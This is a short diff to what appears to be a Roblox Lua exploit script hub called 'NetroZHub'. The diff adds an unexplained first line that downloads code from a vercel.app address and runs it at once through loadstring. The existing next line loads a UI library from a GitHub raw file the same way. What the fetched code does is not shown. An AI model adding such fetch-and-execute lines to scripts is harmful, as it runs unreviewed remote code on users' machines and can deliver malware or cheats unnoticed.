@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://scriptsneonauth.vercel.app/api/scripts/4a200654-19c4-4d23-9fa1-dab7182adb0e/raw"))()
+
 local Libary = loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/refs/heads/main/DovEn529"))()
 local Window = Libary:MakeWindow({
     Title = "👹NetroZHub- فريق",
